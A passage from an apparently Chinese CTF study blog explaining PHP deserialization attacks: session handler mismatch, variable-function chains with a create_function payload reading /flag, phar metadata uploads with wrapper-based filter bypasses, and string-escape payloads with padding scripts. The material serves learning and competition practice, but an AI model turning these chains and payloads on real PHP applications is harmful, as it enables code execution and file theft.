invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br> <br><span class="hljs-comment">// C:19:&quot;SplDoublyLinkedList&quot;:41:&#123;i:0;:O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;&#125;</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplDoublyLinkedList</span>();<br><span class="hljs-variable">$obj</span>-&gt;<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">c</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br></code></pre></td></tr></table></figure><p>用<code>php7.3.4nts</code>来执行<code>php file</code>，不然执行完还是以O开口（对于本人的环境）</p><h3 id="特殊"><a class="markdownIt-Anchor" href="#特殊"></a> 特殊</h3><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">openstack</span> = unserialize($this-&gt;</span>docker);<br>$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">openstack</span>-&gt;</span>neutron = $heat;<br>$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">openstack</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">neutron</span> === $this-&gt;</span><span class="hljs-function"><span class="hljs-title">openstack</span>-&gt;</span>nova<br></code></pre></td></tr></table></figure><p><code>$heat</code>未知,当<code>this-&gt;docker=null</code>时条件成立。</p><h3 id="session-反序列化"><a class="markdownIt-Anchor" href="#session-反序列化"></a> session 反序列化</h3><p>有三种处理器（在php.ini中设置或者通过ini_set进行设置）</p><table><thead><tr><th style="text-align:left">处理器</th><th style="text-align:left">对应的存储格式</th></tr></thead><tbody><tr><td style="text-align:left">php（默认）</td><td style="text-align:left">键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td style="text-align:left">php_binary</td><td style="text-align:left">键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td style="text-align:left">php_serialize (php&gt;=5.5.4)</td><td style="text-align:left">经过 serialize() 函数反序列处理的数组</td></tr></tbody></table><p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储的文件是以<code>sess_sessionid</code>来进行命名的，文件的内容就是session值的序列化之后的内容</p><p>而且设置了ini_set，之在有设置的脚本上才会起作用，其他没有设置的脚本还是用的默认配置，这里就会到时反序列化的攻击</p><p>也就是当网站序列化并存储Session与反序列化并读取Session的方式不同时就可能导致session反序列化漏洞的产生</p><p>比如，先设置成<code>php_serialize </code>，进行存储时，将序列化的字符串<code>O:6:&quot;Pisces&quot;:2:&#123;s:7:&quot;romance&quot;;N;s:7:&quot;fantasy&quot;;R:2;&#125;</code>前面再加<code>|</code>变成<code>|O:6:&quot;Pisces&quot;:2:&#123;s:7:&quot;romance&quot;;N;s:7:&quot;fantasy&quot;;R:2;&#125;</code>,这个字符串会被再次序列化进行存储变成<code>a:1:&#123;s:2:&quot;m7&quot;;s:52:&quot;|O:6:&quot;Pisces&quot;:2:&#123;s:7:&quot;romance&quot;;N;s:7:&quot;fantasy&quot;;R:2;&#125;&quot;;&#125;</code></p><p>另一个脚本解析时用的是默认的php处理器，会把<code>&#123;s:2:&quot;m7&quot;;s:52:&quot;</code>当成键名，<code>O:6:&quot;Pisces&quot;:2:&#123;s:7:&quot;romance&quot;;N;s:7:&quot;fantasy&quot;;R:2;&#125;&quot;;&#125;</code>当成要反序列化的内容，所以直接成功执行我们自己构造的链子</p><h3 id="可变函数调用双重反序列化"><a class="markdownIt-Anchor" href="#可变函数调用双重反序列化"></a> 可变函数调用双重反序列化</h3><p>通常反序列化都是利用<strong>魔术方法</strong>进行函数调用，但也可以通过反序列化指定要调用的普通方法（<strong>利用数组</strong>）</p><p>可变函数是指，函数名是一个变量，然后后面加():<code>$fun()</code></p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$b</span> = [<span class="hljs-variable">$a</span>, <span class="hljs-string">&quot;readflag&quot;</span>];<br><span class="hljs-variable">$b</span>(); <span class="hljs-comment">//数组可以调用指定的方法</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cancer</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, <span class="hljs-keyword">__METHOD__</span>);<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;key)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;code=<span class="hljs-string">&#x27;&#125;system(&quot;cat /flag&quot;);//&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;func=<span class="hljs-string">&quot;create_function&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, <span class="hljs-keyword">__METHOD__</span>);<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>        <span class="hljs-variable">$a</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cancer</span>();<br><span class="hljs-variable">$g</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetFlag</span>();<br><span class="hljs-variable">$arr</span> = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetFlag</span>(), <span class="hljs-string">&#x27;create&#x27;</span>];<br><span class="hljs-variable">$c</span>-&gt;key=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>));<br><br></code></pre></td></tr></table></figure><h3 id="phar反序列化"><a class="markdownIt-Anchor" href="#phar反序列化"></a> phar反序列化</h3><p>可以在phar这个压缩文件中存储一个对象，当这个压缩文件被PHP读取时，就会反序列化这个对象（一般要结合文件上传，上传的后缀可不是.phar，可以是其他，一样可以反序列化）</p><h4 id="能够造成反序列化的函数"><a class="markdownIt-Anchor" href="#能够造成反序列化的函数"></a> 能够造成反序列化的函数</h4><table><thead><tr><th>fileatime</th><th>filectime</th><th>file_exists</th><th>file_get_contents</th></tr></thead><tbody><tr><td><strong>file_put_contents</strong></td><td><strong>file</strong></td><td><strong>filegroup</strong></td><td><strong>fopen</strong></td></tr><tr><td><strong>fileinode</strong></td><td><strong>filemtime</strong></td><td><strong>fileowner</strong></td><td><strong>fileperms</strong></td></tr><tr><td><strong>is_dir</strong></td><td><strong>is_executable</strong></td><td><strong>is_file</strong></td><td><strong>is_link</strong></td></tr><tr><td><strong>is_readable</strong></td><td><strong>is_writable</strong></td><td><strong>is_writeable</strong></td><td><strong>parse_ini_file</strong></td></tr><tr><td><strong>copy</strong></td><td><strong>unlink</strong></td><td><strong>stat</strong></td><td><strong>readfile</strong></td></tr><tr><td><strong>exif_thumbnail</strong></td><td><strong>exif_imagetype</strong></td><td><strong>imageloadfont</strong></td><td><strong>imagecreatefromxxx</strong></td></tr><tr><td><strong>hash_hmac_file</strong></td><td><strong>hash_file</strong></td><td><strong>hash_update_file</strong></td><td><strong>md5_file</strong></td></tr><tr><td><strong>sha1_file</strong></td><td><strong>get_meta_tags</strong></td><td><strong>get_headers</strong></td><td><strong>getimagesize</strong></td></tr><tr><td><strong>getimagesizefromstring</strong></td><td><strong>zip</strong></td><td><strong>Bzip / Gzip</strong></td><td><strong>Postgres</strong></td></tr><tr><td><strong>MySQL</strong></td><td></td><td></td><td></td></tr></tbody></table><p><a href="https://evalexp.top/p/64706/">https://evalexp.top/p/64706/</a></p><p>php代码生成带有对象的PHAR文件，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Aquarius</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, <span class="hljs-keyword">__METHOD__</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Aquarius</span>();<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;A.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>); <span class="hljs-comment">//添加压缩文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="hljs-comment">//如果有文件头检测可以加上文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//自动计算签名</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><p>运行时需要将phar.readOnly设为Off，上面的类要根据题目修改，</p><p>将文件上传后，结合函数<code>fiel_get_contents,file_exist</code>这些文件操作函数进行文件包含</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">phar:<span class="hljs-regexp">//u</span>ploads<span class="hljs-regexp">/A.phar/</span>test.txt<br></code></pre></td></tr></table></figure><h4 id="phar被过滤"><a class="markdownIt-Anchor" href="#phar被过滤"></a> phar被过滤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$black_list</span>=[<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;glob&#x27;</span>,<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-string">&#x27;http&#x27;</span>,<span class="hljs-string">&#x27;ftp&#x27;</span>,<span class="hljs-string">&#x27;zip&#x27;</span>,<span class="hljs-string">&#x27;https&#x27;</span>,<span class="hljs-string">&#x27;ftps&#x27;</span>,<span class="hljs-string">&#x27;phar&#x27;</span>];<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">compress.bzip:<span class="hljs-regexp">//</span>phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/test.phar/</span>test.txt<br>compress.bzip2:<span class="hljs-regexp">//</span>phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/test.phar/</span>test.txt<br>compress.zlib:<span class="hljs-regexp">//</span>phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/home/</span>sx<span class="hljs-regexp">/test.phar/</span>test.txt<br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/resource=phar:/</span><span class="hljs-regexp">//</span>test.phar/test.txt<br></code></pre></td></tr></table></figure><h3 id="反序列化字符逃逸"><a class="markdownIt-Anchor" href="#反序列化字符逃逸"></a> 反序列化字符逃逸</h3><p>明显特征时有反序列化函数并且对序列化字符串进行替换</p><p>逃逸可以实现修改属性的值</p><h4 id="替换后字符串变长"><a class="markdownIt-Anchor" href="#替换后字符串变长"></a> 替换后字符串变长</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaa&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-comment">// echo serialize($AA).&quot;\n&quot;;$res=filter(serialize($AA));</span><br><br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>反序列化字符串都是以一<code>&quot;;&#125;</code>结束的，所以如果把<code>&quot;;&#125;</code>带入需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就丢弃了。</p><p>反序列化时字符串取的长度由s后面的数字决定，修改长度会把那些闭合符号都当成字符串去读取</p><p>字符逃逸利用方法：</p><p>比如要将<code>$pass</code>的值变长<code>hacker</code></p><p>先构造pass的值为hacker的序列化字符串<code>s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;</code></p><p>进行前后闭合<code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</code></p><p>计算这个串的长度27</p><p>计算每次替换会多出的字符数1，填充27/1=27个字符</p><p>然后把值赋给在<strong>前一个相邻</strong>的变量</p><p>有两个变量就能实现</p><p>所以<code>$name='bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;'</code></p><p>序列化变成<code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</code></p><p>写个小脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var_name</span>=<span class="hljs-string">&#x27;pass&#x27;</span>; <span class="hljs-comment">#输入要修改的变量名</span><br><span class="hljs-variable">$value</span>=<span class="hljs-string">&#x27;hacker&#x27;</span>; <span class="hljs-comment">#输入要修改为的值</span><br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&quot;;s:&#x27;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$var_name</span>).<span class="hljs-string">&#x27;:&quot;&#x27;</span>.<span class="hljs-variable">$var_name</span>.<span class="hljs-string">&#x27;&quot;;s:&#x27;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$value</span>).<span class="hljs-string">&#x27;:&quot;&#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&#x27;&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$replaced_value</span>=<span class="hljs-string">&#x27;bb&#x27;</span>;<br><span class="hljs-variable">$replace_value</span>=<span class="hljs-string">&#x27;ccc&#x27;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-variable">$replaced_value</span>,<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>)/(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$replace_value</span>)-<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$replaced_value</span>))).<span class="hljs-variable">$str</span>;<br><span class="hljs-keyword">print</span>(<span class="hljs-variable">$str</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;CTF&#x27;</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaa&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$phone</span>=<span class="hljs-string">&#x27;123&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$escape</span>=<span class="hljs-title function_ invoke__">get_object_vars</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>)));<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$escape</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))&#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$escape</span>[<span class="hljs-string">&#x27;$pass&#x27;</span>]));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>要修改pass的值，这里需要确保phone是数组的结果，所以不能通过给phone赋值，否则会破坏掉数组结构，所以要通过给name赋值来改</p><p>先正常赋值打印出正常的序列化结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaa&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$phone</span>=<span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">&#x27;1&#x27;</span>=&gt;<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$email</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">1</span>;i:<span class="hljs-number">2</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>利用小脚本进行替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var_name</span>=<span class="hljs-string">&#x27;email&#x27;</span>; <span class="hljs-comment">#输入要修改的变量名</span><br><span class="hljs-variable">$value</span>=<span class="hljs-string">&#x27;/flag&#x27;</span>; <span class="hljs-comment">#输入要修改为的值</span><br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&quot;;s:&#x27;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$var_name</span>).<span class="hljs-string">&#x27;:&quot;&#x27;</span>.<span class="hljs-variable">$var_name</span>.<span class="hljs-string">&#x27;&quot;;s:&#x27;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$value</span>).<span class="hljs-string">&#x27;:&quot;&#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&#x27;&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$replaced_value</span>=<span class="hljs-string">&#x27;CTF&#x27;</span>;<br><span class="hljs-variable">$replace_value</span>=<span class="hljs-string">&#x27;hacker&#x27;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-variable">$replaced_value</span>,<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>)/(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$replace_value</span>)-<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$replaced_value</span>))).<span class="hljs-variable">$str</span>;<br><span class="hljs-keyword">print</span>(<span class="hljs-variable">$str</span>);<br><span class="hljs-meta">?&gt;</span><br>CTFCTFCTFCTFCTFCTFCTFCTFCTF<span class="hljs-string">&quot;;s:5:&quot;</span>email<span class="hljs-string">&quot;;s:5:&quot;</span>/flag<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>把phone的序列化结果拿下来</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">10</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>长度为54，每一个CTF可以加长度3，所以需要18个CTF</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">name</span><span class="hljs-operator">=</span>CTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTF<span class="hljs-string">&quot;;s:5:&quot;</span>phone<span class="hljs-string">&quot;;a:1:&#123;i:1;i:10;&#125;s:5:&quot;</span>email<span class="hljs-string">&quot;;s:5:&quot;</span>/flag<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h4 id="替换后字符串变短"><a class="markdownIt-Anchor" href="#替换后字符串变短"></a> 替换后字符串变短</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 